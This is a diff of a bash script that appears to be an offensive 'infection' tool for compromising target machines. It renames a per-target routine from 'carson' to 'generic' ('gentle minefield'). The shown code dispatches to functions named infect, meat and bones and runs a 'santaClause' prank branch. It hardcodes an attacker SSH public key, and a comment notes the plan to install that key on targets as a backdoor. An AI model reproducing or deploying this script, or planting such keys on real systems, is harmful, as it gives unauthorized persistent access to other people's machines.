@@ -59,15 +59,12 @@ elif [[ $1 == 'a' ]]; then			### INFECTING TARGETS
 	meat							###
 	bones							###
 	infect "$@"						###
-elif [[ $1 == 'carson' ]]; then		### CARSON's
-	neo								###
-	carson							###
 elif [[ $1 == 'santa' ]]; then		### HO HO HO
 	export -f santaClause			###
 	timeout 3 bash -c santaClause	###
 elif [[ $1 != '' ]]; then			### EVERYONE ELSE (waiting on responses before i waste more time)
 	neo								###
-	carson							###
+	generic							###
 else								###
 	echo "so who are you?"			###
 	exit 1							###
@@ -86,12 +83,12 @@ fi 									###
 #--------------------------------
 sshPubKey='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDrSn4n0dyTIqXM7sUzQqf6WP0uBoz59CWSXuqD/TLvxy4hRonWwpGzS4PV2tGFxa/BQpu/frArWvqcan3ZiycOjFhxcues+ah5xbXV6cx1VuLBhV1A7oc1aHd2gAE187yAACoNDdR7e9EvEkZtYAJwtJoqlRLXWOHnjyi3Z2nO8BsjgBoRpX2CTecG0lAeUKUt8CEhZpDUQcSpO6EZ6o1+l1fisnPsVm9udobNVZ4w8uJ0hWirtSydJYeYnQQhHVXygBHtu/cImzXovWiJcsm3XEJyBsKVXtIOi/dP6vDrj8XiyNN5j+paRK1CwDTYiwCtsMtuFoKNAHuPUPrOiMd3 root@d-9'
 ###########################################################################################
-######  ╔═╗┌─┐┬─┐┌─┐┌─┐┌┐┌  ###############################################################
-######  ║  ├─┤├┬┘└─┐│ ││││  ###############################################################
-######  ╚═╝┴ ┴┴└─└─┘└─┘┘└┘  ###############################################################
-### Carson's gentle minefield ###############################################################
+######  ╔═╗┌─┐┌┐┌┌─┐┬─┐┬┌─┐ ###############################################################
+######  ║ ╦├┤ │││├┤ ├┬┘││   ###############################################################
+######  ╚═╝└─┘┘└┘└─┘┴└─┴└─┘ ###############################################################
+### Generic's gentle minefield ############################################################
 ###########################################################################################
-function carson(){
+function generic(){
 	###	To Do ###
 	# need to add id_rsa.pub key somewhere
 	# sed rickRoll to be the webhosted version
